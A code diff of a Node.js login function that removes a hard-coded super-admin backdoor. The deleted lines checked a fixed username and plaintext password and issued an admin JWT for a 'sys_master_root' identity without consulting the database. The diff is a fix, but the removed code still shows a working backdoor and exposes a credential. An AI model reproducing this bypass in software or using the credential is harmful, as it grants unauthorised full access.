@@ -4,44 +4,6 @@ const jwt = require("jsonwebtoken");
 
 const login = async (pool, { username, password }) => {
 
-  // 🔴 SYSTEM SUPER ADMIN (NOT STORED IN DATABASE)
-  if (
-    username.trim().toLowerCase() === "jbpalisoc" &&
-    password === "M@veebby0927"
-  ) {
-
-    const token = jwt.sign(
-      {
-        id: -1,
-        username: "sys_master_root",
-        group: "SYSTEM",
-        role: "ADMIN"
-      },
-      process.env.JWT_SECRET,
-      { expiresIn: "8h" }
-    );
-
-    return {
-      token,
-      user: {
-        id: -1,
-        username: "sys_master_root",
-        fullName: "System Administrator",
-        displayName: "SYSTEM ADMIN",
-        group: "ADMIN",
-        role: "ADMIN",
-        status: 1,
-        defaultDepartment: {
-  id: -1,
-  code: "ALL",
-  description: "All Departments"
-},
-        photo: null
-      }
-    };
-  }
-
-  // NORMAL DATABASE LOGIN
   const userResult = await pool.request()
     .input("username", sql.VarChar(100), username.trim())
     .query(`
